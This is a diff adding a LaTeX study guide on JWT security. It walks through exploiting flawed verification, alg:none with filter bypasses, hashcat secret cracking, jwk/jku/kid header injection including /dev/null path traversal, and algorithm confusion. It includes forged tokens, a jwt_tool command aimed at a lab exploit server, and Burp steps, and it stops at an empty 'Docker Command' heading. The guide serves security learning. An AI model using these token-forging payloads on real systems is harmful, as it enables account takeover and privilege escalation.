@@ -1,0 +1,1024 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
+\usepackage{enumitem}
+
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+
+% Configure listings for JSON and JWT display
+\lstset{
+    numbers=none,
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10},
+    keywordstyle=\color{blue},
+    commentstyle=\color{green!60!black},
+    stringstyle=\color{red}
+}
+
+\renewcommand{\lstlistingname}{Listing}
+
+% Custom box for important notes
+\newtcolorbox{notebox}[1][]{
+    colback=yellow!10,
+    colframe=black!20,
+    fonttitle=\bfseries,
+    title=#1
+}
+
+\newtcolorbox{attackbox}[1][]{
+    colback=red!5,
+    colframe=red!40!black,
+    fonttitle=\bfseries,
+    title=#1
+}
+
+\title{JWT Security Notes: Understanding and Exploiting JWT Vulnerabilities}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+
+
+\tableofcontents
+\newpage
+
+\section*{Introduction}
+\addcontentsline{toc}{section}{Introduction}
+
+JSON Web Tokens (JWTs) are a standardized format for sending cryptographically signed 
+JSON data between systems. They can theoretically contain any kind of data, but are most 
+commonly used to send information ("claims") about users as part of authentication, 
+session handling, and access control mechanisms.
+
+Unlike classic session tokens, all of the data that a server needs is stored client-side 
+within the JWT itself. This makes JWTs a popular choice for highly distributed websites 
+where users need to interact seamlessly with multiple back-end servers.
+
+\section{JWT Structure and Format}
+
+A JWT consists of three parts: a header, a payload, and a signature. These are each 
+separated by a dot, as shown in the following example:
+
+\begin{lstlisting}[caption=Example JWT Token]
+  eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.
+  eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhI
+  iwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1
+  vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw
+  6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alS
+  CZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYX
+  pGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQ
+  iBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
+\end{lstlisting}
+
+\subsection{Header}
+
+The header is a base64url-encoded JSON object containing metadata about the token itself:
+
+\begin{itemize}
+    \item \textbf{typ}: Token type (typically "JWT")
+    \item \textbf{alg}: Signing algorithm used (e.g., HS256, RS256)
+    \item \textbf{kid}: Key ID (optional, used to identify the signing key)
+\end{itemize}
+
+\subsection{Payload}
+
+The payload contains the actual "claims" about the user. Decoding the payload from the 
+example token above reveals:
+
+\begin{lstlisting}[caption=Decoded JWT Payload]
+{
+    "iss": "portswigger",
+    "exp": 1648037164,
+    "name": "Carlos Montoya",
+    "sub": "carlos",
+    "role": "blog_author",
+    "email": "carlos@carlos-montoya.net",
+    "iat": 1516239022
+}
+\end{lstlisting}
+
+\begin{notebox}[Important Note]
+In most cases, the header and payload data can be easily read or modified by anyone 
+with access to the token. Therefore, the security of any JWT-based mechanism is heavily 
+reliant on the cryptographic signature.
+\end{notebox}
+
+\subsection{Signature}
+
+The server that issues the token typically generates the signature by hashing the header 
+and payload. In some cases, they also encrypt the resulting hash. This process involves 
+a secret signing key and provides a way for servers to verify that none of the data 
+within the token has been tampered with since it was issued:
+
+\begin{itemize}
+    \item As the signature is directly derived from the rest of the token, changing a 
+          single byte of the header or payload results in a mismatched signature.
+    \item Without knowing the server's secret signing key, it shouldn't be possible to 
+          generate the correct signature for a given header or payload.
+\end{itemize}
+
+\begin{notebox}[Pro Tip]
+If you want to gain a better understanding of how JWTs are constructed, you can use the 
+debugger on \url{https://jwt.io} to experiment with arbitrary tokens.
+\end{notebox}
+
+\section{JWT vs JWS vs JWE}
+
+The JWT specification is actually very limited. It only defines a format for representing 
+information ("claims") as a JSON object that can be transferred between two parties. In 
+practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by 
+both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications.
+
+\subsection{Relationship Between JWT, JWS, and JWE}
+
+\begin{itemize}
+    \item \textbf{JWT (JSON Web Token)}: Base specification defining the claim format
+    \item \textbf{JWS (JSON Web Signature)}: Extends JWT to add digital signatures or HMAC
+    \item \textbf{JWE (JSON Web Encryption)}: Extends JWT to add encryption
+\end{itemize}
+
+\begin{notebox}[Note]
+For simplicity, throughout these materials, "JWT" refers primarily to JWS tokens, 
+although some of the vulnerabilities described may also apply to JWE tokens. When 
+people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, 
+except that the actual contents of the token are encrypted rather than just encoded.
+\end{notebox}
+
+\section{Understanding JWT Attacks}
+
+\subsection{What Are JWT Attacks?}
+
+JWT attacks involve a user sending modified JWTs to the server in order to achieve a 
+malicious goal. Typically, this goal is to bypass authentication and access controls 
+by impersonating another user who has already been authenticated.
+
+\subsection{Impact of JWT Attacks}
+
+The impact of JWT attacks is usually severe. If an attacker is able to create their 
+own valid tokens with arbitrary values, they may be able to escalate their own 
+privileges or impersonate other users, taking full control of their accounts.
+
+\subsection{How Do Vulnerabilities to JWT Attacks Arise?}
+
+JWT vulnerabilities typically arise due to flawed JWT handling within the application 
+itself. The various specifications related to JWTs are relatively flexible by design, 
+allowing website developers to decide many implementation details for themselves. This 
+can result in them accidentally introducing vulnerabilities even when using battle-hardened 
+libraries.
+
+These implementation flaws usually mean that the signature of the JWT is not verified 
+properly. This enables an attacker to tamper with the values passed to the application 
+via the token's payload. Even if the signature is robustly verified, whether it can truly 
+be trusted relies heavily on the server's secret key remaining a secret. If this key is 
+leaked in some way, or can be guessed or brute-forced, an attacker can generate a valid 
+signature for any arbitrary token, compromising the entire mechanism.
+
+\section{Exploiting Flawed Signature Verification}
+
+\subsection{The Core Problem}
+
+Servers don't store issued JWTs, making each token self-contained. Without proper signature 
+verification, the server cannot detect if a token was modified.
+
+\subsection{Attack Scenario}
+
+Consider this JWT payload:
+\begin{lstlisting}[caption=Vulnerable JWT Payload]
+{
+    "username": "carlos",
+    "isAdmin": false
+}
+\end{lstlisting}
+
+An attacker can modify:
+\begin{itemize}
+    \item \texttt{username} → impersonate other users
+    \item \texttt{isAdmin} → privilege escalation
+\end{itemize}
+
+\subsection{Common Implementation Flaw}
+
+JWT libraries offer two methods:
+\begin{itemize}
+    \item \texttt{verify()} - validates signature
+    \item \texttt{decode()} - only decodes, no validation
+\end{itemize}
+
+\begin{attackbox}[Critical Flaw]
+Developers sometimes use \texttt{decode()} instead of \texttt{verify()}, 
+accepting arbitrary tokens with no signature validation.
+\end{attackbox}
+
+\section{Exploiting the \texttt{alg} Parameter}
+
+\subsection{The Core Problem}
+
+The JWT header contains an \texttt{alg} parameter that tells the server which algorithm was used to sign the token:
+
+\begin{lstlisting}[caption=JWT Header]
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+\end{lstlisting}
+
+\begin{attackbox}[Critical Design Flaw]
+The server trusts user-controllable input (the \texttt{alg} value) from an unverified token to decide how to verify the token itself.
+\end{attackbox}
+
+\subsection{The "none" Algorithm Attack}
+
+JWTs can be signed with different algorithms or left unsigned by setting:
+
+\begin{lstlisting}[caption=Unsecured JWT Header]
+{
+    "alg": "none",
+    "typ": "JWT"
+}
+\end{lstlisting}
+
+\subsection{Attack Workflow}
+
+\begin{enumerate}
+    \item Attacker intercepts a valid JWT
+    \item Modifies payload (e.g., sets \texttt{"admin": true})
+    \item Changes header \texttt{alg} from \texttt{HS256} to \texttt{none}
+    \item Removes signature part entirely
+    \item Token format becomes: \texttt{HEADER.PAYLOAD.}
+\end{enumerate}
+
+\subsection{Example}
+
+Original token:
+\begin{verbatim}
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZXlhZCIsImFkbWluIjpmYWxzZX0.signature
+\end{verbatim}
+
+Modified token:
+\begin{verbatim}
+eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiZXlhZCIsImFkbWluIjp0cnVlfQ.
+\end{verbatim}
+
+\subsection{Bypassing Filters}
+
+Servers may try to block \texttt{alg: none}, but can be bypassed with:
+
+\begin{itemize}
+    \item Case variation: \texttt{"None"}, \texttt{"NONE"}, \texttt{"nOnE"}
+    \item Whitespace: \texttt{"none "}
+    \item Null byte: \texttt{"none\textbackslash u0000"}
+    \item Unexpected encodings
+\end{itemize}
+
+\begin{notebox}[Important]
+Even with \texttt{alg: none}, the payload must be terminated with a trailing dot.
+\end{notebox}
+
+\subsection{Why Modern Libraries Are Safe}
+
+Good JWT libraries protect against these attacks by:
+
+\begin{itemize}
+    \item Rejecting the \texttt{"none"} algorithm completely
+    \item Requiring developers to explicitly specify allowed algorithms
+    \item Never auto-trusting values from the token header
+\end{itemize}
+
+\subsection{Secure Implementation}
+
+\begin{lstlisting}[caption=Secure JWT Verification]
+// UNSAFE - trusts token header
+jwt.decode(token, secret)
+
+// SAFE - explicitly specifies algorithm
+jwt.decode(token, secret, algorithms=["HS256"])
+\end{lstlisting}
+
+\section{Brute-Forcing Secret Keys}
+
+\subsection{The Vulnerability}
+
+Some algorithms (like HS256) use a standalone string as the secret key. If this key is weak or guessable, attackers can brute-force it and forge arbitrary tokens.
+
+\subsection{Using Hashcat}
+
+Hashcat can brute-force JWT secrets using mode 16500:
+
+\begin{lstlisting}[caption=Hashcat Command]
+hashcat -a 0 -m 16500 <jwt> <wordlist>
+\end{lstlisting}
+
+If a secret is found, hashcat outputs:
+\begin{verbatim}
+<jwt>:<identified-secret>
+\end{verbatim}
+
+\begin{notebox}[Note]
+Use the \texttt{--show} flag to output results again on subsequent runs.
+\end{notebox}
+
+\subsection{Practical Attack Workflow}
+
+\begin{enumerate}
+    \item \textbf{Obtain} a valid JWT from the target
+    \item \textbf{Brute-force} the secret using hashcat
+    \item \textbf{Base64 encode} the discovered secret
+    \item \textbf{Create} a new symmetric key in JWT Editor with the encoded secret
+    \item \textbf{Modify} the JWT payload (e.g., change \texttt{sub} to \texttt{administrator})
+    \item \textbf{Sign} the modified token with the cracked key
+    \item \textbf{Send} the forged token to access restricted endpoints
+\end{enumerate}
+
+\section{JWT Header Parameter Injections}
+
+\subsection{Attack-Relevant Header Parameters}
+
+Beyond the mandatory \texttt{alg}, these headers are particularly useful to attackers:
+
+\begin{itemize}
+    \item \textbf{\texttt{jwk}} (JSON Web Key) - Embeds the public key directly in the token
+    \item \textbf{\texttt{jku}} (JSON Web Key Set URL) - URL to fetch a key set containing the verification key
+    \item \textbf{\texttt{kid}} (Key ID) - Identifier used by the server to select the correct key
+\end{itemize}
+
+These user-controllable parameters tell the server which key to use when verifying the signature.
+
+\subsection{Injecting Self-Signed JWTs via \texttt{jwk}}
+
+\subsubsection{How It Works}
+
+The \texttt{jwk} parameter allows servers to embed public keys directly in the token:
+
+\begin{lstlisting}[caption=JWT Header with Embedded JWK]
+{
+    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+    }
+}
+\end{lstlisting}
+
+\subsubsection{The Vulnerability}
+
+Ideally, servers should only use a limited whitelist of public keys. However, misconfigured servers sometimes use any key embedded in the \texttt{jwk} parameter.
+
+\subsubsection{Attack Steps - Manual}
+
+\begin{enumerate}
+    \item Generate your own RSA key pair (private + public)
+    \item Modify the JWT payload (e.g., change \texttt{sub} or \texttt{admin})
+    \item Sign the modified token with your private key
+    \item Embed the matching public key in the \texttt{jwk} header
+    \item Update the \texttt{kid} header to match the embedded key's \texttt{kid}
+\end{enumerate}
+
+\subsubsection{Attack Steps - Using JWT Editor}
+
+\begin{enumerate}
+    \item In Burp's main tab bar, go to the \textbf{JWT Editor Keys} tab
+    \item Click \textbf{New RSA Key}
+    \item In the dialog, click \textbf{Generate} to automatically create a new key pair
+    \item Click \textbf{OK} to save the key (key size is auto-selected)
+    \item Send a request containing a JWT to Burp Repeater
+    \item Switch to the \textbf{JSON Web Token} tab in the message editor
+    \item Modify the token's payload as desired (sub to admin)
+    \item Click \textbf{Attack} → \textbf{Embedded JWK}
+    \item Select your newly generated RSA key when prompted
+    \item Send the request to test the server response
+\end{enumerate}
+
+\begin{attackbox}[Key Concept]
+The extension's built-in attack automatically handles updating the \texttt{kid} header to match the embedded key.
+\end{attackbox}
+
+\begin{notebox}[Public vs Private Keys]
+- \textbf{Private key}: Used by you to sign the token (kept secret)
+- \textbf{Public key}: Embedded in \texttt{jwk} for server verification (sent with token)
+\end{notebox}
+
+\subsection{Injecting Self-Signed JWTs via \texttt{jku}}
+
+\subsubsection{How It Works}
+
+Instead of embedding the public key directly, the \texttt{jku} (JWK Set URL) header parameter tells the server where to fetch a JWK Set containing the verification key.
+
+\begin{lstlisting}[caption=JWK Set Format]
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
+            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67W
+                hsN3JvaFYw-fhvsWQ"
+        }
+    ]
+}
+\end{lstlisting}
+
+\subsubsection{The Vulnerability}
+
+Servers may fetch keys from untrusted URLs if they fail to validate the domain properly.
+
+\subsubsection{Practical Example: PortSwigger Lab}
+
+\textbf{Target:} JWT-based session handling with \texttt{jku} support but no domain validation.
+
+\textbf{Step 1:} Original JWT
+\begin{verbatim}
+eyJraWQiOiIzYWZiMjYxMC1lYmM2LTQ5ODctOTg3YS01M2ZiNTczYTBkNTYiLCJhbGciOiJSUzI1NiJ9.
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUwNDI3Miwic3ViIjoid2llbmVyIn0.
+5Q8g9OnQ6MzkDZdxy9Li1zVW1DHOGBjT1oJ7zCleLgXpKJR_fenJK97fZCUBGTaNZ1U46cnHaqjKh7Wei
+gnVFu7IHmoPOEoas-8R8MkD5R-FPRX9oiCj6BI-XYoLokBV3ipPRczXnADfuAXH60g0up5U8CgmUT--q6gNfXJOvKxk7No
+CtEJ08dFYaQFHQnjKLdroKbZzf3ETDXxSZ7FJrJRHvjet2pzxzqJiqEdVK75B3fdjiJMzfBHHFfLm6f
+1SlHd6UJbFTRq-B3WqfMF3h0uMeYnUw1tLc-0feBCrd4zwpeyO4cc16-fYNlKlf70ly9mOg8SY-tcX7M6eKe8Cow
+\end{verbatim}
+
+\textbf{Step 2:} Use JWT Tool to forge token
+\begin{lstlisting}[caption=JWT Tool Command]
+jwt_tool <Original JWT> -X s -ju https://exploit-0a0c00a503071af581e6332f011600b2.exploit-server.net/exploit -T
+\end{lstlisting}
+
+\textbf{Step 3:} Modify parameters in interactive mode
+\begin{itemize}
+    \item Change \texttt{kid} to "jwt\_tool"
+    \item Change \texttt{sub} from "wiener" to "administrator"
+\end{itemize}
+
+\textbf{Step 4:} JWKS file generated at:
+\begin{verbatim}
+/home/eyad/.jwt_tool/jwttool_custom_jwks.json
+\end{verbatim}
+
+\begin{lstlisting}[caption=Generated JWKS]
+{
+    "keys":[
+        {
+            "kty":"RSA",
+            "kid":"jwt_tool",
+            "use":"sig",
+            "e":"AQAB",
+            "n":"wDjc_fwZXtEHt5qkm49-so6NvLWBQUDL2EGPeCZMuGt5XXN0Q-ftaQyW4uUpBhi
+            rkIQQ7SQe8_iotV_ZeYqB7Zkp1cT7t0S5w_EKAdJidChLs4ZzTu4a-1RgxUDXIsdvQNL
+            Bkrbzk1dLs8YU43v2pmwmn9BhFV0hFQ7QqAueAQRguYgEH8wKB5civrteN1KK0rmz0Np
+            Y9Eq1Uvno2YRHhSz6E2bV9p2Ca7CoxJe5an3HV3mtS-OxXARoKpw9AIQGVuAdh4_MiRN
+            cBB_1l3I6b8BThDVEu-49zbHXhcVLtYcgQXkXQztHwAHFEvDyZFzVCnGFcv3HNJq3TEj
+            N0Blx2Q"
+        }
+    ]
+}
+\end{lstlisting}
+
+\textbf{Step 5:} Forged token with \texttt{jku} header:
+\begin{verbatim}
+eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9leHBsb2l0LTBhMGMwMGE1MDMwNzFhZjU4MWU2MzMyZjAxMTYwMGIyLmV4cGxvaXQtc2VydmVyLm5ldC9leHBsb2l0In0.
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUwNDI3Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+fHgaDhUOsYTDti91VlYo4SJ7KnEiNl3pHdHEknJ9RhPBELIUMAaBi8bSgpUkYCrsmWCo6fv4SuwCcJZMUvrbIm0WsfJCxX9_DQtDwQ6fDtTmvhNt8rBsXAlVCP8f821F7BJdnH36xEEHAkONrndZdW4l-G_ZBC2t57RGWgOuyeRwJmUesWLyjZ2kxdBe77psIquB9K93W7GtE-PntN98R4R4um3NNMhqGiNbH1mcyd31FfKC324bFlYPTEPP2kUmn9Qo2az025Fko1vtzNC7WpszsIqqUbz4mXCN8LrErOjNHscC_Skt1kcZfiGzpVYLnzARgxjqMPntfkJUADRhyQ
+\end{verbatim}
+
+\textbf{Step 6:} Host the JWKS at the exploit server URL and send the forged token to access \texttt{/admin} and delete the user.
+
+\subsection{Injecting Self-Signed JWTs via \texttt{kid}}
+
+\subsubsection{Understanding the \texttt{kid} Parameter}
+
+The \texttt{kid} (Key ID) header parameter helps servers identify which key to use when verifying the signature. This is useful when multiple keys are in use.
+
+\begin{lstlisting}[caption=JWT Header with kid]
+{
+    "kid": "key-123",
+    "typ": "JWT",
+    "alg": "HS256"
+}
+\end{lstlisting}
+
+\subsubsection{The Critical Weakness}
+
+The JWS specification doesn't define a concrete structure for \texttt{kid} - it's just an arbitrary string chosen by the developer. This flexibility creates danger:
+
+\begin{itemize}
+    \item Developers might use \texttt{kid} to point to database entries
+    \item Or worse - use it as a file path to read the key from disk
+\end{itemize}
+
+\subsubsection{Path Traversal Attack}
+
+If the server uses \texttt{kid} to construct a file path, an attacker can inject directory traversal sequences:
+
+\begin{lstlisting}[caption=Malicious Header with Path Traversal]
+{
+    "kid": "../../../../../../../dev/null",
+    "typ": "JWT",
+    "alg": "HS256"
+}
+\end{lstlisting}
+
+\subsubsection{Why \texttt{/dev/null} is Dangerous}
+
+\begin{itemize}
+    \item \texttt{/dev/null} exists on most Linux systems
+    \item It's an empty file - reading it returns an empty string
+    \item If the server uses the file contents as the verification key, the key becomes an empty string
+    \item An attacker can then sign tokens with an empty string secret
+\end{itemize}
+
+\subsubsection{Practical Attack Steps}
+
+\textbf{Step 1:} Create a symmetric key with null byte secret
+
+\begin{enumerate}
+    \item In Burp, go to \textbf{JWT Editor Keys} tab
+    \item Click \textbf{New Symmetric Key}
+    \item Click \textbf{Generate} to create a new key
+    \item Replace the \texttt{k} property value with \textbf{AA==} (Base64-encoded null byte)
+    \begin{verbatim}
+    "k": "AA=="
+    \end{verbatim}
+    \item Click \textbf{OK} to save
+\end{enumerate}
+
+\begin{notebox}[Note]
+The JWT Editor extension requires Base64-encoded values, so we use \texttt{AA==} as a workaround for the empty string.
+\end{notebox}
+
+\textbf{Step 2:} Modify the JWT
+
+\begin{enumerate}
+    \item Send a request with a JWT to Burp Repeater
+    \item Switch to the \textbf{JSON Web Token} editor tab
+    \item In the header, change \texttt{kid} to a path traversal pointing to \texttt{/dev/null}:
+    \begin{verbatim}
+    "kid": "../../../../../../../dev/null"
+    \end{verbatim}
+    \item In the payload, change \texttt{sub} to \texttt{administrator} (or any privileged user)
+\end{enumerate}
+
+\textbf{Step 3:} Sign the forged token
+
+\begin{enumerate}
+    \item Click \textbf{Sign} at the bottom of the tab
+    \item Select the symmetric key you created (with \texttt{AA==} secret)
+    \item Ensure \textbf{Don't modify header} is selected
+    \item Click \textbf{OK}
+\end{enumerate}
+
+\subsubsection{How It Works}
+
+\begin{attackbox}[Attack Chain]
+1. Server reads \texttt{kid} = "../../../../../../../dev/null"
+2. Server traverses filesystem to \texttt{/dev/null}
+3. Server reads file contents → empty string
+4. Server uses empty string as verification key
+5. Server accepts token signed with empty string secret
+6. Privilege escalation achieved (e.g., \texttt{sub: administrator})
+\end{attackbox}
+
+\subsubsection{Why This Is Dangerous}
+
+\begin{itemize}
+    \item The server trusts user input (\texttt{kid}) to locate its verification key
+    \item No validation of what file is being read
+    \item Predictable system files like \texttt{/dev/null} exist everywhere
+    \item Results in complete bypass of signature verification
+\end{itemize}
+
+\subsubsection{Alternative Attack Vectors}
+
+While \texttt{/dev/null} is the simplest, attackers could also target:
+\begin{itemize}
+    \item Known configuration files with predictable contents
+    \item Files containing default or empty values
+    \item Any file the web server has read access to
+\end{itemize}
+
+\section{Other Interesting JWT Header Parameters}
+
+Beyond the commonly exploited parameters, two additional headers can open up new attack vectors.
+
+\subsection{\texttt{cty} (Content Type)}
+
+\subsubsection{Purpose}
+
+The \texttt{cty} (Content Type) header parameter declares the media type of the content in the JWT payload. While usually omitted, underlying parsing libraries may still support it.
+
+\subsubsection{Attack Potential}
+
+If you've found a way to bypass signature verification, injecting a \texttt{cty} header can enable new attack vectors:
+
+\begin{lstlisting}[caption=Injecting cty Header]
+{
+    "alg": "none",
+    "typ": "JWT",
+    "cty": "text/xml"
+}
+\end{lstlisting}
+
+\begin{itemize}
+    \item \textbf{text/xml} - Could enable XXE (XML External Entity) attacks if the payload is parsed as XML
+    \item \textbf{application/x-java-serialized-object} - Could trigger deserialization vulnerabilities
+\end{itemize}
+
+\begin{attackbox}[Attack Chain]
+Signature bypass + content type change = New attack surface
+\end{attackbox}
+
+\subsection{\texttt{x5c} (X.509 Certificate Chain)}
+
+\subsubsection{Purpose}
+
+The \texttt{x5c} header parameter is used to pass the X.509 public key certificate (or certificate chain) of the key used to sign the JWT.
+
+\subsubsection{Attack Potential}
+
+Similar to \texttt{jwk} injection, but using X.509 certificates:
+
+\begin{lstlisting}[caption=x5c Header Example]
+{
+    "alg": "RS256",
+    "typ": "JWT",
+    "x5c": ["MIIE3jCCA8agAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwgYQxCzAJBgNVBAYTAlVT..."],
+    "x5t": "S8UdU5JqumxiJcHys7yY1v9PjOY"
+}
+\end{lstlisting}
+
+\subsubsection{Attack Vectors}
+
+\begin{enumerate}
+    \item \textbf{Certificate Injection} - Embed a self-signed certificate to trick the server into accepting your own signing key
+    \item \textbf{Parsing Vulnerabilities} - X.509 certificate parsing is complex and error-prone, leading to CVEs:
+    \begin{itemize}
+        \item \textbf{CVE-2017-2800} - Node.js JWS implementation vulnerability
+        \item \textbf{CVE-2018-2633} - Oracle Java JWT parsing issue
+    \end{itemize}
+\end{enumerate}
+
+\subsection{Summary of Attackable Header Parameters}
+
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Parameter} & \textbf{Attack Vector} \\
+\hline
+\texttt{jwk} & Embed your own public key \\
+\texttt{jku} & Host your own JWKS and point to it \\
+\texttt{kid} & Path traversal to force key selection \\
+\texttt{cty} & Change content type for XXE/deserialization \\
+\texttt{x5c} & Inject self-signed certificates \\
+\hline
+\end{tabular}
+
+\begin{notebox}[Key Takeaway]
+Any user-controllable header parameter that influences key selection or content handling is a potential attack surface. Always validate and whitelist expected values.
+\end{notebox}
+
+\section{Symmetric vs Asymmetric Algorithms}
+
+\subsection{Symmetric Algorithms (e.g., HS256)}
+
+\begin{itemize}
+    \item Use a \textbf{single key} for both signing and verification
+    \item The key must be kept secret, like a password
+    \item Example: HS256 (HMAC + SHA-256)
+\end{itemize}
+
+\subsection{Asymmetric Algorithms (e.g., RS256)}
+
+\begin{itemize}
+    \item Use a \textbf{key pair}: private key and public key
+    \item \textbf{Private key}: Used by server to sign tokens (kept secret)
+    \item \textbf{Public key}: Used by anyone to verify signatures (often shared)
+    \item Example: RS256 (RSA + SHA-256)
+\end{itemize}
+
+\section{Algorithm Confusion Vulnerabilities}
+
+\subsection{How Vulnerabilities Arise}
+
+Many JWT libraries provide a single, algorithm-agnostic method for verification:
+
+\begin{lstlisting}[caption=Pseudo-code of Vulnerable Library]
+function verify(token, secretOrPublicKey){
+    algorithm = token.getAlgHeader();
+    if(algorithm == "RS256"){
+        // Use the provided key as an RSA public key
+    } else if (algorithm == "HS256"){
+        // Use the provided key as an HMAC secret key
+    }
+}
+\end{lstlisting}
+
+\subsection{The Flawed Assumption}
+
+Developers often assume the method will only handle asymmetric algorithms:
+
+\begin{lstlisting}[caption=Vulnerable Implementation]
+publicKey = <public-key-of-server>;
+token = request.getCookie("session");
+verify(token, publicKey);  // Always passes the public key
+\end{lstlisting}
+
+\begin{attackbox}[The Critical Flaw]
+If an attacker sends a token with \texttt{alg: HS256}, the library treats the RSA public key as an HMAC secret key.
+\end{attackbox}
+
+\subsection{Algorithm Confusion Attack Steps}
+
+\subsubsection{Step 1: Obtain the Server's Public Key}
+
+Servers often expose public keys via standard endpoints:
+\begin{itemize}
+    \item \texttt{/jwks.json}
+    \item \texttt{/.well-known/jwks.json}
+\end{itemize}
+Even if the key isn't exposed publicly, you may be able to extract it from a pair of existing JWTs.
+
+\begin{lstlisting}[caption=JWK Set Response]
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
+            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
+        }
+    ]
+}
+\end{lstlisting}
+
+\subsubsection{Step 2: Convert Public Key to Suitable Format}
+
+The key you use must match the server's copy EXACTLY (every byte, including non-printing characters).
+
+\textbf{Using JWT Editor Extension:}
+
+\begin{enumerate}
+    \item Go to \textbf{JWT Editor Keys} tab
+    \item Click \textbf{New RSA Key} and paste the JWK
+    \item Select \textbf{PEM} radio button and copy the PEM key
+    \item Go to \textbf{Decoder} tab and Base64-encode the PEM
+    \item Go back to \textbf{JWT Editor Keys} tab
+    \item Click \textbf{New Symmetric Key} → \textbf{Generate}
+    \item Replace the \texttt{k} parameter with your Base64-encoded PEM
+    \item Save the key
+\end{enumerate}
+
+\begin{lstlisting}[caption=Symmetric Key with Public Key as Secret]
+{
+    "kty": "oct",
+    "kid": "018c36ae-4bea-45c9-b4f1-7fb93c3312b3",
+    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvK3l5MXdwWW1mZmdYQnhoQVVKegpISG9jQ3VKb2x3RHFxbDc1Wld1Q1EvY2IzMksydmg5bWs2R1BNOWdOTjRZL3FUVlg2N1doc04zSnZhRll3K2ZoCnZzV1EuLi4KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
+}
+\end{lstlisting}
+
+\subsubsection{Step 3: Modify the JWT}
+
+\begin{enumerate}
+    \item Change \texttt{alg} header from \texttt{RS256} to \texttt{HS256}
+    \item Modify payload claims (e.g., \texttt{sub: administrator})
+\end{enumerate}
+
+\begin{lstlisting}[caption=Modified JWT Header]
+{
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab"
+}
+\end{lstlisting}
+
+\subsubsection{Step 4: Sign with the Public Key}
+
+\begin{enumerate}
+    \item In the \textbf{JSON Web Token} tab, click \textbf{Sign}
+    \item Select the symmetric key you created
+    \item Ensure \textbf{Don't modify header} is selected
+    \item Click \textbf{OK}
+\end{enumerate}
+
+\subsection{Why This Works}
+
+\begin{attackbox}[Attack Mechanics]
+1. Server exposes RSA public key via /jwks.json
+2. Attacker creates token with alg: HS256
+3. Attacker signs token using the public key as HMAC secret
+4. Server receives token, sees alg: HS256
+5. Server uses the same public key as HMAC secret for verification
+6. Signature matches → token accepted
+7. Privilege escalation achieved
+\end{attackbox}
+
+\begin{notebox}[Critical Success Factors]
+\begin{itemize}
+    \item The public key used for signing must match the server's key exactly (same format, same bytes)
+    \item The server must be using a vulnerable JWT library
+    \item The server must not restrict which algorithms are allowed
+\end{itemize}
+\end{notebox}
+
+\section{Deriving Public Keys from Existing Tokens}
+
+\subsection{The Challenge}
+
+Sometimes the server doesn't expose its public key via \texttt{/jwks.json}. In this case, you can still perform algorithm confusion attacks by deriving the key from multiple JWTs.
+
+\subsection{Using sig2n Tools}
+
+Two options are available:
+\begin{itemize}
+    \item \textbf{jwt\_forgery.py} - from the rsa\_sign2n GitHub repository
+    \item \textbf{PortSwigger's Docker image} - Simplified version (recommended)
+\end{itemize}
+
+\subsection{Docker Command}
+
